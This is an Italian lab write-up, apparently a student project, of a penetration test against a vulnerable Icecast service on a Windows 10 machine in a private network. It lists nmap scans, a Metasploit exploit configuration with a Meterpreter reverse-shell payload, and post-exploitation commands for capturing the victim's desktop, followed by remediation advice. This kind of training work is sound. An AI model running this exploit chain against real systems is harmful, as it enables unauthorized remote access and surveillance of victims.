
# 🔐 **Penetration Test con Metasploit e Icecast su Windows 10**

## 🚀 Introduzione
In questo progetto abbiamo condotto un test di penetrazione su una macchina **Windows 10** con il servizio **Icecast** vulnerabile. Utilizzando il framework **Metasploit** su **Kali Linux**, siamo riusciti a ottenere una sessione **Meterpreter**, visualizzare l’indirizzo IP della vittima e catturare uno screenshot del desktop compromesso.

---

## 🎯 Obiettivi
- 🔍 Identificare la macchina vittima (con Icecast vulnerabile).
- ⚙️ Sfruttare la vulnerabilità per ottenere una shell Meterpreter.
- 📡 Visualizzare l’indirizzo IP della vittima dalla sessione Meterpreter.
- 📸 Catturare uno screenshot del desktop della macchina vittima.

---

## 🌐 Ambiente di Lavoro
- **Attaccante (Kali Linux)**: IP `192.168.1.150`
- **Vittima (Windows 10 con Icecast)**: IP `192.168.1.153`
- **Rete**: 192.168.1.0/24

---

## 📜 Passi Seguiti

### 1️⃣ **Scansione della Rete e Identificazione della Vittima**
Abbiamo innanzitutto identificato la macchina vittima nella rete locale con:
```bash
sudo arp-scan --localnet
```
Una volta trovato l’IP della vittima (`192.168.1.153`), abbiamo verificato la porta di default di Icecast (8000):
```bash
nmap -p 8000 192.168.1.153
```

**📸 Screenshot:**  
_(Inserire screenshot della scansione nmap che mostra la porta chiusa)_

---

### 2️⃣ **Avvio di Icecast sulla Vittima e Verifica**
Sulla macchina Windows 10 abbiamo:
- Avviato **Icecast**.
- Disattivato temporaneamente il firewall o creato una regola di eccezione per la porta 8000.

Quindi, verificando dal browser:
```
http://192.168.1.153:8000
```
Abbiamo ottenuto una risposta, confermando che Icecast era attivo e rispondeva alle richieste.

**📸 Screenshot:**  
_(Inserire screenshot del browser che mostra la risposta di Icecast)_

---

### 3️⃣ **Verifica Porta 8000 Aperta**
Nuovamente con nmap:
```bash
nmap -p 8000 192.168.1.153
```
Ora la porta 8000 risultava **open**, confermando che Icecast era accessibile dalla nostra macchina Kali.

**📸 Screenshot:**  
_(Inserire screenshot della scansione nmap con la porta aperta)_

---

### 4️⃣ **Sfruttamento della Vulnerabilità con Metasploit**
Abbiamo avviato Metasploit:
```bash
msfconsole
```
Configurato l’exploit per Icecast:
```bash
use exploit/windows/http/icecast_header
set RHOSTS 192.168.1.153
set RPORT 8000
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.150
set LPORT 4444
exploit
```

**📸 Screenshot del primo tentativo fallito:**  
_(Inserire screenshot del tentativo fallito)_  

**📸 Screenshot della sessione Meterpreter ottenuta:**  
_(Inserire screenshot della sessione Meterpreter avviata con successo)_  

---

### 5️⃣ **Interazione con la Sessione Meterpreter**
Una volta ottenuta la sessione Meterpreter:
- **Visualizzazione dell’indirizzo IP della vittima**:
  ```bash
  meterpreter > ipconfig
  ```
  Questo comando ha mostrato le interfacce di rete e gli indirizzi IP della macchina vittima.

**📸 Screenshot:**  
_(Inserire screenshot del comando ipconfig eseguito su Meterpreter)_  

- **Cattura di uno screenshot del desktop remoto**:
  ```bash
  meterpreter > screenshot
  ```
  Lo screenshot è stato salvato sulla macchina Kali (ad esempio `/home/kali/OquUbpix.jpeg`).

Per visualizzare l’immagine su Kali:
```bash
xdg-open /home/kali/OquUbpix.jpeg
```

**📸 Screenshot del comando screenshot:**  
_(Inserire screenshot del comando screenshot eseguito con successo)_  

**📸 Visualizzazione dello screenshot:**  
_(Inserire screenshot dell’immagine visualizzata su Kali)_  

---

## 🔒 Post-Exploitation & Considerazioni
Dopo aver raggiunto gli obiettivi, abbiamo:
- Chiuso la sessione Meterpreter:
  ```bash
  meterpreter > exit
  ```
- Riattivato il firewall sulla macchina vittima.
- Proposto di aggiornare Icecast all’ultima versione per correggere la vulnerabilità sfruttata.
- Suggerito di implementare regole IDS/IPS e segmentazione di rete per limitare futuri attacchi.

---

## 📝 Conclusioni
Questo test ha dimostrato come una vulnerabilità in un servizio (Icecast) possa fornire a un attaccante l’accesso remoto a una macchina Windows. Con Metasploit siamo riusciti a:
- Identificare la macchina vulnerabile.
- Avviare un exploit contro Icecast.
- Ottenere una shell Meterpreter.
- Visualizzare l’indirizzo IP della vittima.
- Catturare uno screenshot del desktop remoto.

---

## 📂 Allegati
Nella cartella [`/screenshots`](./screenshots/) sono presenti:
- **nmap_scan.png**: Scansione porta 8000 (chiusa).
- **icecast_browser.png**: Risposta dal browser dopo l’avvio di Icecast.
- **nmap_port_open.png**: Scansione porta 8000 (aperta).
- **exploit_failed.png**: Tentativo fallito di exploit.
- **meterpreter_session.png**: Sessione Meterpreter ottenuta.
- **ipconfig_meterpreter.png**: Output del comando ipconfig.
- **screenshot_command.png**: Comando screenshot.
- **screenshot_view.png**: Visualizzazione dello screenshot catturato.

Tutte le immagini completano visivamente il processo descritto.
